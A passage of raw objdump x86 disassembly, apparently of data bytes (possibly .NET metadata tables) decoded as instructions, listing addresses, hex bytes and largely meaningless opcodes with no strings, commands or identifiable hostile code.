  405cb1:	05 12 13 05 00       	add    $0x51312,%eax
  405cb6:	39 00                	cmp    %eax,(%eax)
  405cb8:	87 00                	xchg   %eax,(%eax)
  405cba:	81 01 10 00 1d 04    	addl   $0x41d0010,(%ecx)
  405cc0:	12 13                	adc    (%ebx),%dl
  405cc2:	05 00 3a 00 89       	add    $0x89003a00,%eax
  405cc7:	00 81 01 10 00 12    	add    %al,0x12001001(%ecx)
  405ccd:	04 12                	add    $0x12,%al
  405ccf:	13 05 00 3a 00 8d    	adc    0x8d003a00,%eax
  405cd5:	00 81 01 10 00 52    	add    %al,0x52001001(%ecx)
  405cdb:	1a f0                	sbb    %al,%dh
  405cdd:	0c 05                	or     $0x5,%al
  405cdf:	00 3b                	add    %bh,(%ebx)
  405ce1:	00 92 00 83 01 10    	add    %dl,0x10018300(%edx)
  405ce7:	00 f2                	add    %dh,%dl
  405ce9:	02 00                	add    (%eax),%al
  405ceb:	00 05 00 3c 00 97    	add    %al,0x97003c00
  405cf1:	00 01                	add    %al,(%ecx)
  405cf3:	00 10                	add    %dl,(%eax)
  405cf5:	00 41 03             	add    %al,0x3(%ecx)
  405cf8:	82 23 05             	andb   $0x5,(%ebx)
  405cfb:	00 3d 00 97 00 81    	add    %bh,0x81009700
  405d01:	01 10                	add    %edx,(%eax)
  405d03:	00 09                	add    %cl,(%ecx)
  405d05:	08 82 23 05 00 44    	or     %al,0x44000523(%edx)
  405d0b:	00 9e 00 81 01 10    	add    %bl,0x10018100(%esi)
  405d11:	00 69 18             	add    %ch,0x18(%ecx)
  405d14:	82 23 05             	andb   $0x5,(%ebx)
  405d17:	00 44 00 a0          	add    %al,-0x60(%eax,%eax,1)
  405d1b:	00 00                	add    %al,(%eax)
  405d1d:	01 00                	add    %eax,(%eax)
  405d1f:	00 09                	add    %cl,(%ecx)
  405d21:	23 00                	and    (%eax),%eax
  405d23:	00 05 00 44 00 a2    	add    %al,0xa2004400
  405d29:	00 13                	add    %dl,(%ebx)
  405d2b:	01 00                	add    %eax,(%eax)
  405d2d:	00 ea                	add    %ch,%dl
  405d2f:	03 00                	add    (%eax),%eax
  405d31:	00 61 00             	add    %ah,0x0(%ecx)
  405d34:	46                   	inc    %esi
  405d35:	00 a2 00 13 01 00    	add    %ah,0x11300(%edx)
  405d3b:	00 6e 05             	add    %ch,0x5(%esi)
  405d3e:	00 00                	add    %al,(%eax)
  405d40:	61                   	popa
  405d41:	00 46 00             	add    %al,0x0(%esi)
  405d44:	a2 00 16 00 a5       	mov    %al,0xa5001600
  405d49:	07                   	pop    %es
  405d4a:	12 00                	adc    (%eax),%al
  405d4c:	16                   	push   %ss
  405d4d:	00 d0                	add    %dl,%al
  405d4f:	04 12                	add    $0x12,%al
  405d51:	00 16                	add    %dl,(%esi)
  405d53:	00 dc                	add    %bl,%ah
  405d55:	07                   	pop    %es
  405d56:	12 00                	adc    (%eax),%al
  405d58:	16                   	push   %ss
  405d59:	00 a1 20 12 00 16    	add    %ah,0x16001220(%ecx)
  405d5f:	00 74 18 12          	add    %dh,0x12(%eax,%ebx,1)
  405d63:	00 16                	add    %dl,(%esi)
  405d65:	00 02                	add    %al,(%edx)
  405d67:	0a 12                	or     (%edx),%dl
  405d69:	00 16                	add    %dl,(%esi)
  405d6b:	00 6c 07 12          	add    %ch,0x12(%edi,%eax,1)
  405d6f:	00 16                	add    %dl,(%esi)
  405d71:	00 3f                	add    %bh,(%edi)
  405d73:	0b 12                	or     (%edx),%edx
  405d75:	00 16                	add    %dl,(%esi)
  405d77:	00 c4                	add    %al,%ah
  405d79:	1d 12 00 16 00       	sbb    $0x160012,%eax
  405d7e:	cf                   	iret
  405d7f:	12 12                	adc    (%edx),%dl
  405d81:	00 16                	add    %dl,(%esi)
  405d83:	00 f2                	add    %dh,%dl
  405d85:	06                   	push   %es
  405d86:	15 00 16 00 51       	adc    $0x51001600,%eax
  405d8b:	08 12                	or     %dl,(%edx)
  405d8d:	00 16                	add    %dl,(%esi)
  405d8f:	00 58 09             	add    %bl,0x9(%eax)
  405d92:	19 00                	sbb    %eax,(%eax)
  405d94:	16                   	push   %ss
  405d95:	00 11                	add    %dl,(%ecx)
  405d97:	24 12                	and    $0x12,%al
  405d99:	00 16                	add    %dl,(%esi)
  405d9b:	00 ca                	add    %cl,%dl
  405d9d:	23 12                	and    (%edx),%edx
  405d9f:	00 16                	add    %dl,(%esi)
  405da1:	00 91 06 12 00 16    	add    %dl,0x16001206(%ecx)
  405da7:	00 ec                	add    %ch,%ah
  405da9:	07                   	pop    %es
  405daa:	12 00                	adc    (%eax),%al
  405dac:	11 00                	adc    %eax,(%eax)
  405dae:	af                   	scas   %es:(%edi),%eax
  405daf:	0c 21                	or     $0x21,%al
  405db1:	00 11                	add    %dl,(%ecx)
  405db3:	00 94 0c 25 00 11 00 	add    %dl,0x110025(%esp,%ecx,1)
  405dba:	64 0c 29             	fs or  $0x29,%al
  405dbd:	00 11                	add    %dl,(%ecx)
  405dbf:	00 18                	add    %bl,(%eax)
  405dc1:	0c 2d                	or     $0x2d,%al
  405dc3:	00 11                	add    %dl,(%ecx)
  405dc5:	00 7c 0c 2d          	add    %bh,0x2d(%esp,%ecx,1)
  405dc9:	00 11                	add    %dl,(%ecx)
  405dcb:	00 fd                	add    %bh,%ch
  405dcd:	0b 30                	or     (%eax),%esi
  405dcf:	00 11                	add    %dl,(%ecx)
  405dd1:	00 e0                	add    %ah,%al
  405dd3:	0b 34 00             	or     (%eax,%eax,1),%esi
  405dd6:	31 00                	xor    %eax,(%eax)
  405dd8:	c6                   	(bad)
  405dd9:	0b 37                	or     (%edi),%esi
  405ddb:	00 11                	add    %dl,(%ecx)
  405ddd:	00 34 0c             	add    %dh,(%esp,%ecx,1)
  405de0:	30 00                	xor    %al,(%eax)
  405de2:	11 00                	adc    %eax,(%eax)
  405de4:	4a                   	dec    %edx
  405de5:	0c 3a                	or     $0x3a,%al
  405de7:	00 11                	add    %dl,(%ecx)
  405de9:	00 38                	add    %bh,(%eax)
  405deb:	04 c3                	add    $0xc3,%al
  405ded:	00 01                	add    %al,(%ecx)
  405def:	00 55 05             	add    %dl,0x5(%ebp)
  405df2:	f2 00 01             	repnz add %al,(%ecx)
  405df5:	00 bb 05 3a 00 01    	add    %bh,0x1003a05(%ebx)
  405dfb:	00 55 05             	add    %dl,0x5(%ebp)
  405dfe:	f2 00 01             	repnz add %al,(%ecx)
  405e01:	00 0b                	add    %cl,(%ebx)
  405e03:	07                   	pop    %es
  405e04:	10 01                	adc    %al,(%ecx)
  405e06:	01 00                	add    %eax,(%eax)
  405e08:	9f                   	lahf
  405e09:	02 12                	add    (%edx),%dl
  405e0b:	00 01                	add    %al,(%ecx)
  405e0d:	00 f1                	add    %dh,%cl
  405e0f:	09 12                	or     %edx,(%edx)
  405e11:	00 01                	add    %al,(%ecx)
  405e13:	00 d3                	add    %dl,%bl
  405e15:	03 37                	add    (%edi),%esi
  405e17:	00 01                	add    %al,(%ecx)
  405e19:	00 2f                	add    %ch,(%edi)
  405e1b:	12 4b 01             	adc    0x1(%ebx),%cl
  405e1e:	01 00                	add    %eax,(%eax)
  405e20:	0a 01                	or     (%ecx),%al
  405e22:	10 01                	adc    %al,(%ecx)
  405e24:	01 00                	add    %eax,(%eax)
  405e26:	55                   	push   %ebp
  405e27:	05 f2 00 01 00       	add    $0x100f2,%eax
  405e2c:	1c 15                	sbb    $0x15,%al
  405e2e:	4f                   	dec    %edi
  405e2f:	01 06                	add    %eax,(%esi)
  405e31:	06                   	push   %es
  405e32:	33 0a                	xor    (%edx),%ecx
  405e34:	3a 00                	cmp    (%eax),%al
  405e36:	56                   	push   %esi
  405e37:	80 e4 02             	and    $0x2,%ah
  405e3a:	4b                   	dec    %ebx
  405e3b:	01 56 80             	add    %edx,-0x80(%esi)
  405e3e:	02 13                	add    (%ebx),%dl
  405e40:	4b                   	dec    %ebx
  405e41:	01 56 80             	add    %edx,-0x80(%esi)
  405e44:	60                   	pusha
  405e45:	1b 4b 01             	sbb    0x1(%ebx),%ecx
  405e48:	56                   	push   %esi
  405e49:	80 1d 05 4b 01 56 80 	sbbb   $0x80,0x56014b05
  405e50:	d5 09                	aad    $0x9
  405e52:	4b                   	dec    %ebx
  405e53:	01 56 80             	add    %edx,-0x80(%esi)
  405e56:	d3 01                	roll   %cl,(%ecx)
  405e58:	4b                   	dec    %ebx
  405e59:	01 56 80             	add    %edx,-0x80(%esi)
  405e5c:	6c                   	insb   (%dx),%es:(%edi)
  405e5d:	23 4b 01             	and    0x1(%ebx),%ecx
  405e60:	56                   	push   %esi
  405e61:	80 92 08 4b 01 56 80 	adcb   $0x80,0x56014b08(%edx)
  405e68:	28 17                	sub    %dl,(%edi)
  405e6a:	4b                   	dec    %ebx
  405e6b:	01 56 80             	add    %edx,-0x80(%esi)
  405e6e:	6b 14 4b 01          	imul   $0x1,(%ebx,%ecx,2),%edx
  405e72:	56                   	push   %esi
  405e73:	80 17 0b             	adcb   $0xb,(%edi)
  405e76:	4b                   	dec    %ebx
  405e77:	01 56 80             	add    %edx,-0x80(%esi)
  405e7a:	a0 09 4b 01 06       	mov    0x6014b09,%al
  405e7f:	06                   	push   %es
  405e80:	33 0a                	xor    (%edx),%ecx
  405e82:	87 02                	xchg   %eax,(%edx)
  405e84:	56                   	push   %esi
  405e85:	80 2a 04             	subb   $0x4,(%edx)
  405e88:	8a 02                	mov    (%edx),%al
  405e8a:	56                   	push   %esi
  405e8b:	80 70 24 8a          	xorb   $0x8a,0x24(%eax)
  405e8f:	02 56 80             	add    -0x80(%esi),%dl
  405e92:	c7                   	(bad)
  405e93:	09 8a 02 16 00 a0    	or     %ecx,-0x5fffe9fe(%edx)
  405e99:	08 93 02 31 00 63    	or     %dl,0x63003102(%ebx)
  405e9f:	26 12 00             	adc    %es:(%eax),%al
  405ea2:	16                   	push   %ss
  405ea3:	00 67 03             	add    %ah,0x3(%edi)
  405ea6:	f2 00 16             	repnz add %dl,(%esi)
  405ea9:	00 bf 14 b6 02 51    	add    %bh,0x5102b614(%edi)
  405eaf:	80 e3 09             	and    $0x9,%bl
  405eb2:	3a 00                	cmp    (%eax),%al
  405eb4:	51                   	push   %ecx
  405eb5:	80 34 0b 3a          	xorb   $0x3a,(%ebx,%ecx,1)
  405eb9:	00 51 80             	add    %dl,-0x80(%ecx)
  405ebc:	63 01                	arpl   %eax,(%ecx)
  405ebe:	3a 00                	cmp    (%eax),%al
  405ec0:	51                   	push   %ecx
  405ec1:	80 a8 04 3a 00 21 00 	subb   $0x0,0x21003a04(%eax)
  405ec8:	1b 17                	sbb    (%edi),%edx
  405eca:	29 00                	sub    %eax,(%eax)
  405ecc:	21 00                	and    %eax,(%eax)
  405ece:	24 06                	and    $0x6,%al
  405ed0:	29 00                	sub    %eax,(%eax)
  405ed2:	31 00                	xor    %eax,(%eax)
  405ed4:	7c 15                	jl     0x405eeb
  405ed6:	29 00                	sub    %eax,(%eax)
  405ed8:	33 01                	xor    (%ecx),%eax
  405eda:	d8 06                	fadds  (%esi)
  405edc:	f2 02 33             	repnz add (%ebx),%dh
  405edf:	01 48 24             	add    %ecx,0x24(%eax)
  405ee2:	f6 02 20             	testb  $0x20,(%edx)
  405ee5:	26 00 00             	add    %al,%es:(%eax)
  405ee8:	00 00                	add    %al,(%eax)
  405eea:	96                   	xchg   %eax,%esi
  405eeb:	00 c2                	add    %al,%dl
  405eed:	18 0a                	sbb    %cl,(%edx)
  405eef:	00 01                	add    %al,(%ecx)
  405ef1:	00 78 20             	add    %bh,0x20(%eax)
  405ef4:	00 00                	add    %al,(%eax)
  405ef6:	00 00                	add    %al,(%eax)
  405ef8:	86 18                	xchg   %bl,(%eax)
  405efa:	7a 1d                	jp     0x405f19
  405efc:	0e                   	push   %cs
  405efd:	00 01                	add    %al,(%ecx)
  405eff:	00 f4                	add    %dh,%ah
  405f01:	26 00 00             	add    %al,%es:(%eax)
  405f04:	00 00                	add    %al,(%eax)
  405f06:	96                   	xchg   %eax,%esi
  405f07:	00 0d 0a 1d 00 01    	add    %cl,0x1001d0a
  405f0d:	00 30                	add    %dh,(%eax)
  405f0f:	28 00                	sub    %al,(%eax)
  405f11:	00 00                	add    %al,(%eax)
  405f13:	00 91 00 47 1b 1d    	add    %dl,0x1d1b4700(%ecx)
  405f19:	00 01                	add    %al,(%ecx)
  405f1b:	00 98 28 00 00 00    	add    %bl,0x28(%eax)
  405f21:	00 91 18 80 1d 0a    	add    %dl,0xa1d8018(%ecx)
  405f27:	00 01                	add    %al,(%ecx)
  405f29:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  405f2f:	00 96 08 00 22 3d    	add    %dl,0x3d220008(%esi)
  405f35:	00 01                	add    %al,(%ecx)
  405f37:	00 87 20 00 00 00    	add    %al,0x20(%edi)
  405f3d:	00 96 08 0e 22 42    	add    %dl,0x42220e08(%esi)
  405f43:	00 01                	add    %al,(%ecx)
  405f45:	00 8f 20 00 00 00    	add    %cl,0x20(%edi)
  405f4b:	00 96 08 e4 21 48    	add    %dl,0x4821e408(%esi)
  405f51:	00 02                	add    %al,(%edx)
  405f53:	00 96 20 00 00 00    	add    %dl,0x20(%esi)
  405f59:	00 96 08 f2 21 4d    	add    %dl,0x4d21f208(%esi)
  405f5f:	00 02                	add    %al,(%edx)
  405f61:	00 9e 20 00 00 00    	add    %bl,0x20(%esi)
  405f67:	00 91 08 5f 1c 53    	add    %dl,0x531c5f08(%ecx)
  405f6d:	00 03                	add    %al,(%ebx)
  405f6f:	00 a5 20 00 00 00    	add    %ah,0x20(%ebp)
  405f75:	00 91 08 6a 1c 58    	add    %dl,0x581c6a08(%ecx)
  405f7b:	00 03                	add    %al,(%ebx)
  405f7d:	00 ad 20 00 00 00    	add    %ch,0x20(%ebp)
  405f83:	00 91 08 64 12 5e    	add    %dl,0x5e126408(%ecx)
  405f89:	00 04 00             	add    %al,(%eax,%eax,1)
  405f8c:	b4 20                	mov    $0x20,%ah
  405f8e:	00 00                	add    %al,(%eax)
  405f90:	00 00                	add    %al,(%eax)
  405f92:	91                   	xchg   %eax,%ecx
  405f93:	08 73 12             	or     %dh,0x12(%ebx)
  405f96:	62 00                	bound  %eax,(%eax)
  405f98:	04 00                	add    $0x0,%al
  405f9a:	bc 20 00 00 00       	mov    $0x20,%esp
  405f9f:	00 91 08 8b 21 5e    	add    %dl,0x5e218b08(%ecx)
  405fa5:	00 05 00 c3 20 00    	add    %al,0x20c300
  405fab:	00 00                	add    %al,(%eax)
  405fad:	00 91 08 96 21 62    	add    %dl,0x62219608(%ecx)
  405fb3:	00 05 00 cb 20 00    	add    %al,0x20cb00
  405fb9:	00 00                	add    %al,(%eax)
  405fbb:	00 91 08 0c 12 67    	add    %dl,0x67120c08(%ecx)
  405fc1:	00 06                	add    %al,(%esi)
  405fc3:	00 d2                	add    %dl,%dl
  405fc5:	20 00                	and    %al,(%eax)
  405fc7:	00 00                	add    %al,(%eax)
  405fc9:	00 91 08 1a 12 6c    	add    %dl,0x6c121a08(%ecx)
  405fcf:	00 06                	add    %al,(%esi)
  405fd1:	00 da                	add    %bl,%dl
  405fd3:	20 00                	and    %al,(%eax)
  405fd5:	00 00                	add    %al,(%eax)
  405fd7:	00 96 08 8b 0b 1d    	add    %dl,0x1d0b8b08(%esi)
  405fdd:	00 07                	add    %al,(%edi)
  405fdf:	00 e1                	add    %ah,%cl
  405fe1:	20 00                	and    %al,(%eax)
  405fe3:	00 00                	add    %al,(%eax)
  405fe5:	00 96 08 9b 0b 72    	add    %dl,0x720b9b08(%esi)
  405feb:	00 07                	add    %al,(%edi)
  405fed:	00 e9                	add    %ch,%cl
  405fef:	20 00                	and    %al,(%eax)
  405ff1:	00 00                	add    %al,(%eax)
  405ff3:	00 91 08 f5 0a 77    	add    %dl,0x770af508(%ecx)
  405ff9:	00 08                	add    %cl,(%eax)
  405ffb:	00 f0                	add    %dh,%al
  405ffd:	20 00                	and    %al,(%eax)
  405fff:	00 00                	add    %al,(%eax)
  406001:	00 91 08 4b 13 67    	add    %dl,0x67134b08(%ecx)
  406007:	00 08                	add    %cl,(%eax)
  406009:	00 f7                	add    %dh,%bh
  40600b:	20 00                	and    %al,(%eax)
  40600d:	00 00                	add    %al,(%eax)
  40600f:	00 91 08 54 13 6c    	add    %dl,0x6c135408(%ecx)
  406015:	00 08                	add    %cl,(%eax)
  406017:	00 ff                	add    %bh,%bh
  406019:	20 00                	and    %al,(%eax)
  40601b:	00 00                	add    %al,(%eax)
  40601d:	00 96 08 ab 16 7b    	add    %dl,0x7b16ab08(%esi)
  406023:	00 09                	add    %cl,(%ecx)
  406025:	00 06                	add    %al,(%esi)
  406027:	21 00                	and    %eax,(%eax)
  406029:	00 00                	add    %al,(%eax)
  40602b:	00 96 08 b8 16 7f    	add    %dl,0x7f16b808(%esi)
  406031:	00 09                	add    %cl,(%ecx)
  406033:	00 3c 29             	add    %bh,(%ecx,%ebp,1)
  406036:	00 00                	add    %al,(%eax)
  406038:	00 00                	add    %al,(%eax)
  40603a:	96                   	xchg   %eax,%esi
  40603b:	00 df                	add    %bl,%bh
  40603d:	01 0a                	add    %ecx,(%edx)
  40603f:	00 0a                	add    %cl,(%edx)
  406041:	00 0e                	add    %cl,(%esi)
  406043:	21 00                	and    %eax,(%eax)
  406045:	00 00                	add    %al,(%eax)
  406047:	00 91 00 81 18 84    	add    %dl,-0x7be77f00(%ecx)
  40604d:	00 0a                	add    %cl,(%edx)
  40604f:	00 19                	add    %bl,(%ecx)
  406051:	21 00                	and    %eax,(%eax)
  406053:	00 00                	add    %al,(%eax)
  406055:	00 91 00 ba 23 89    	add    %dl,-0x76dc4600(%ecx)
  40605b:	00 0b                	add    %cl,(%ebx)
  40605d:	00 34 2c             	add    %dh,(%esp,%ebp,1)
  406060:	00 00                	add    %al,(%eax)
  406062:	00 00                	add    %al,(%eax)
  406064:	96                   	xchg   %eax,%esi
  406065:	00 4a 15             	add    %cl,0x15(%edx)
  406068:	0a 00                	or     (%eax),%al
  40606a:	0f 00 98 2c 00 00 00 	ltr    0x2c(%eax)
  406071:	00 96 00 bc 20 94    	add    %dl,-0x6bdf4400(%esi)
  406077:	00 0f                	add    %cl,(%edi)
  406079:	00 58 2e             	add    %bl,0x2e(%eax)
  40607c:	00 00                	add    %al,(%eax)
  40607e:	00 00                	add    %al,(%eax)
  406080:	96                   	xchg   %eax,%esi
  406081:	00 5e 23             	add    %bl,0x23(%esi)
  406084:	58                   	pop    %eax
  406085:	00 10                	add    %dl,(%eax)
  406087:	00 74 2f 00          	add    %dh,0x0(%edi,%ebp,1)
  40608b:	00 00                	add    %al,(%eax)
  40608d:	00 96 00 20 09 9a    	add    %dl,-0x65f6e000(%esi)
  406093:	00 11                	add    %dl,(%ecx)
  406095:	00 26                	add    %ah,(%esi)
  406097:	21 00                	and    %eax,(%eax)
  406099:	00 00                	add    %al,(%eax)
  40609b:	00 91 00 ad 05 9a    	add    %dl,-0x65fa5300(%ecx)
  4060a1:	00 12                	add    %dl,(%edx)
  4060a3:	00 34 21             	add    %dh,(%ecx,%eiz,1)
  4060a6:	00 00                	add    %al,(%eax)
  4060a8:	00 00                	add    %al,(%eax)
  4060aa:	91                   	xchg   %eax,%ecx
  4060ab:	18 80 1d 0a 00 13    	sbb    %al,0x13000a1d(%eax)
  4060b1:	00 40 21             	add    %al,0x21(%eax)
  4060b4:	00 00                	add    %al,(%eax)
  4060b6:	00 00                	add    %al,(%eax)
  4060b8:	96                   	xchg   %eax,%esi
  4060b9:	00 60 16             	add    %ah,0x16(%eax)
  4060bc:	c7 00 13 00 4d 21    	movl   $0x214d0013,(%eax)
  4060c2:	00 00                	add    %al,(%eax)
  4060c4:	00 00                	add    %al,(%eax)
  4060c6:	96                   	xchg   %eax,%esi
  4060c7:	00 19                	add    %bl,(%ecx)
  4060c9:	03 cd                	add    %ebp,%ecx
  4060cb:	00 14 00             	add    %dl,(%eax,%eax,1)
  4060ce:	08 30                	or     %dh,(%eax)
  4060d0:	00 00                	add    %al,(%eax)
  4060d2:	00 00                	add    %al,(%eax)
  4060d4:	96                   	xchg   %eax,%esi
  4060d5:	00 b9 00 cd 00 15    	add    %bh,0x1500cd00(%ecx)
  4060db:	00 4c 30 00          	add    %cl,0x0(%eax,%esi,1)
  4060df:	00 00                	add    %al,(%eax)
  4060e1:	00 96 00 9c 00 cd    	add    %dl,-0x32ff6400(%esi)
  4060e7:	00 16                	add    %dl,(%esi)
  4060e9:	00 90 30 00 00 00    	add    %dl,0x30(%eax)
  4060ef:	00 96 00 c5 16 d3    	add    %dl,-0x2ce93b00(%esi)
  4060f5:	00 17                	add    %dl,(%edi)
  4060f7:	00 5a 21             	add    %bl,0x21(%edx)
  4060fa:	00 00                	add    %al,(%eax)
  4060fc:	00 00                	add    %al,(%eax)
  4060fe:	96                   	xchg   %eax,%esi
  4060ff:	00 d5                	add    %dl,%ch
  406101:	24 da                	and    $0xda,%al
  406103:	00 18                	add    %bl,(%eax)
  406105:	00 67 21             	add    %ah,0x21(%edi)
  406108:	00 00                	add    %al,(%eax)
  40610a:	00 00                	add    %al,(%eax)
  40610c:	96                   	xchg   %eax,%esi
  40610d:	00 ae 01 e0 00 19    	add    %ch,0x1900e001(%esi)
  406113:	00 8b 21 00 00 00    	add    %cl,0x21(%ebx)
  406119:	00 96 00 e0 14 e6    	add    %dl,-0x19eb2000(%esi)
  40611f:	00 1a                	add    %bl,(%edx)
  406121:	00 9f 21 00 00 00    	add    %bl,0x21(%edi)
  406127:	00 96 00 5d 07 ec    	add    %dl,-0x13f8a300(%esi)
  40612d:	00 1b                	add    %bl,(%ebx)
  40612f:	00 78 20             	add    %bh,0x20(%eax)
  406132:	00 00                	add    %al,(%eax)
  406134:	00 00                	add    %al,(%eax)
  406136:	86 18                	xchg   %bl,(%eax)
  406138:	7a 1d                	jp     0x406157
  40613a:	0e                   	push   %cs
  40613b:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40613e:	ac                   	lods   %ds:(%esi),%al
  40613f:	21 00                	and    %eax,(%eax)
  406141:	00 00                	add    %al,(%eax)
  406143:	00 91 18 80 1d 0a    	add    %dl,0xa1d8018(%ecx)
  406149:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40614c:	b8 21 00 00 00       	mov    $0x21,%eax
  406151:	00 86 18 7a 1d fa    	add    %al,-0x5e285e8(%esi)
  406157:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40615a:	ce                   	into
  40615b:	21 00                	and    %eax,(%eax)
  40615d:	00 00                	add    %al,(%eax)
  40615f:	00 e1                	add    %ah,%cl
  406161:	09 4f 22             	or     %ecx,0x22(%edi)
  406164:	04 01                	add    $0x1,%al
  406166:	1d 00 e1 21 00       	sbb    $0x21e100,%eax
  40616b:	00 00                	add    %al,(%eax)
  40616d:	00 e1                	add    %ah,%cl
  40616f:	01 2a                	add    %ebp,(%edx)
  406171:	23 08                	and    (%eax),%ecx
  406173:	01 1d 00 04 22 00    	add    %ebx,0x220400
  406179:	00 00                	add    %al,(%eax)
  40617b:	00 e1                	add    %ah,%cl
  40617d:	01 66 21             	add    %esp,0x21(%esi)
  406180:	0e                   	push   %cs
  406181:	00 1d 00 0d 22 00    	add    %bl,0x220d00
  406187:	00 00                	add    %al,(%eax)
  406189:	00 86 18 7a 1d 14    	add    %al,0x141d7a18(%esi)
  40618f:	01 1d 00 23 22 00    	add    %ebx,0x222300
  406195:	00 00                	add    %al,(%eax)
  406197:	00 86 00 77 23 20    	add    %al,0x20237700(%esi)
  40619d:	01 1f                	add    %ebx,(%edi)
  40619f:	00 30                	add    %dh,(%eax)
  4061a1:	22 00                	and    (%eax),%al
  4061a3:	00 00                	add    %al,(%eax)
  4061a5:	00 86 00 84 08 25    	add    %al,0x25088400(%esi)
  4061ab:	01 1f                	add    %ebx,(%edi)
  4061ad:	00 44 22 00          	add    %al,0x0(%edx,%eiz,1)
  4061b1:	00 00                	add    %al,(%eax)
  4061b3:	00 86 00 f5 08 2b    	add    %al,0x2b08f500(%esi)
  4061b9:	01 20                	add    %esp,(%eax)
  4061bb:	00 58 22             	add    %bl,0x22(%eax)
  4061be:	00 00                	add    %al,(%eax)
  4061c0:	00 00                	add    %al,(%eax)
  4061c2:	86 00                	xchg   %al,(%eax)
  4061c4:	c1 07 31             	roll   $0x31,(%edi)
  4061c7:	01 21                	add    %esp,(%ecx)
  4061c9:	00 6c 22 00          	add    %ch,0x0(%edx,%eiz,1)
  4061cd:	00 00                	add    %al,(%eax)
  4061cf:	00 86 08 a7 17 37    	add    %al,0x3717a708(%esi)
  4061d5:	01 22                	add    %esp,(%edx)
  4061d7:	00 7a 22             	add    %bh,0x22(%edx)
  4061da:	00 00                	add    %al,(%eax)
  4061dc:	00 00                	add    %al,(%eax)
  4061de:	86 08                	xchg   %cl,(%eax)
  4061e0:	b4 14                	mov    $0x14,%ah
  4061e2:	3d 01 23 00 87       	cmp    $0x87002301,%eax
  4061e7:	22 00                	and    (%eax),%al
  4061e9:	00 00                	add    %al,(%eax)
  4061eb:	00 81 00 f8 04 53    	add    %al,0x5304f800(%ecx)
  4061f1:	01 23                	add    %esp,(%ebx)
  4061f3:	00 c8                	add    %cl,%al
  4061f5:	30 00                	xor    %al,(%eax)
  4061f7:	00 00                	add    %al,(%eax)
  4061f9:	00 81 00 26 03 0e    	add    %al,0xe032600(%ecx)
  4061ff:	00 24 00             	add    %ah,(%eax,%eax,1)
  406202:	08 31                	or     %dh,(%ecx)
  406204:	00 00                	add    %al,(%eax)
  406206:	00 00                	add    %al,(%eax)
  406208:	81 00 46 01 20 01    	addl   $0x1200146,(%eax)
  40620e:	24 00                	and    $0x0,%al
  406210:	30 31                	xor    %dh,(%ecx)
  406212:	00 00                	add    %al,(%eax)
  406214:	00 00                	add    %al,(%eax)
  406216:	81 00 0f 05 58 01    	addl   $0x158050f,(%eax)
  40621c:	24 00                	and    $0x0,%al
  40621e:	a0 31 00 00 00       	mov    0x31,%al
  406223:	00 86 00 cf 14 25    	add    %al,0x2514cf00(%esi)
  406229:	01 25 00 a1 22 00    	add    %esp,0x22a100
  40622f:	00 00                	add    %al,(%eax)
  406231:	00 81 00 45 04 20    	add    %al,0x20044500(%ecx)
  406237:	01 26                	add    %esp,(%esi)
  406239:	00 bf 22 00 00 00    	add    %bh,0x22(%edi)
  40623f:	00 81 00 55 1b 20    	add    %al,0x201b5500(%ecx)
  406245:	01 26                	add    %esp,(%esi)
  406247:	00 dd                	add    %bl,%ch
  406249:	22 00                	and    (%eax),%al
  40624b:	00 00                	add    %al,(%eax)
  40624d:	00 86 00 4c 18 20    	add    %al,0x20184c00(%esi)
  406253:	01 26                	add    %esp,(%esi)
  406255:	00 c8                	add    %cl,%al
  406257:	31 00                	xor    %eax,(%eax)
  406259:	00 00                	add    %al,(%eax)
  40625b:	00 81 00 99 04 5d    	add    %al,0x5d049900(%ecx)
  406261:	01 26                	add    %esp,(%esi)
  406263:	00 84 32 00 00 00 00 	add    %al,0x0(%edx,%esi,1)
  40626a:	81 00 2c 24 5d 01    	addl   $0x15d242c,(%eax)
  406270:	27                   	daa
  406271:	00 e5                	add    %ah,%ch
  406273:	22 00                	and    (%eax),%al
  406275:	00 00                	add    %al,(%eax)
  406277:	00 86 00 b1 20 63    	add    %al,0x6320b100(%esi)
  40627d:	01 28                	add    %ebp,(%eax)
  40627f:	00 fa                	add    %bh,%dl
  406281:	22 00                	and    (%eax),%al
  406283:	00 00                	add    %al,(%eax)
  406285:	00 86 00 9c 24 68    	add    %al,0x68249c00(%esi)
  40628b:	01 29                	add    %ebp,(%ecx)
  40628d:	00 28                	add    %ch,(%eax)
  40628f:	33 00                	xor    (%eax),%eax
  406291:	00 00                	add    %al,(%eax)
  406293:	00 86 00 5b 03 6d    	add    %al,0x6d035b00(%esi)
  406299:	01 2a                	add    %ebp,(%edx)
  40629b:	00 cc                	add    %cl,%ah
  40629d:	33 00                	xor    (%eax),%eax
  40629f:	00 00                	add    %al,(%eax)
  4062a1:	00 86 00 bc 06 71    	add    %al,0x7106bc00(%esi)
  4062a7:	01 2a                	add    %ebp,(%edx)
  4062a9:	00 70 34             	add    %dh,0x34(%eax)
  4062ac:	00 00                	add    %al,(%eax)
  4062ae:	00 00                	add    %al,(%eax)
  4062b0:	86 00                	xchg   %al,(%eax)
  4062b2:	d4 00                	aam    $0x0
  4062b4:	75 01                	jne    0x4062b7
  4062b6:	2a 00                	sub    (%eax),%al
  4062b8:	0f 23 00             	mov    %eax,%db0
  4062bb:	00 00                	add    %al,(%eax)
  4062bd:	00 86 00 8d 03 79    	add    %al,0x79038d00(%esi)
  4062c3:	01 2a                	add    %ebp,(%edx)
  4062c5:	00 00                	add    %al,(%eax)
  4062c7:	35 00 00 00 00       	xor    $0x0,%eax
  4062cc:	86 00                	xchg   %al,(%eax)
  4062ce:	b1 07                	mov    $0x7,%cl
  4062d0:	7f 01                	jg     0x4062d3
  4062d2:	2b 00                	sub    (%eax),%eax
  4062d4:	20 23                	and    %ah,(%ebx)
  4062d6:	00 00                	add    %al,(%eax)
  4062d8:	00 00                	add    %al,(%eax)
  4062da:	86 00                	xchg   %al,(%eax)
  4062dc:	1f                   	pop    %ds
  4062dd:	18 84 01 2b 00 35 23 	sbb    %al,0x2335002b(%ecx,%eax,1)
  4062e4:	00 00                	add    %al,(%eax)
  4062e6:	00 00                	add    %al,(%eax)
  4062e8:	86 00                	xchg   %al,(%eax)
  4062ea:	fe                   	(bad)
  4062eb:	14 8a                	adc    $0x8a,%al
  4062ed:	01 2d 00 b0 35 00    	add    %ebp,0x35b000
  4062f3:	00 00                	add    %al,(%eax)
  4062f5:	00 86 00 90 09 90    	add    %al,-0x6ff67000(%esi)
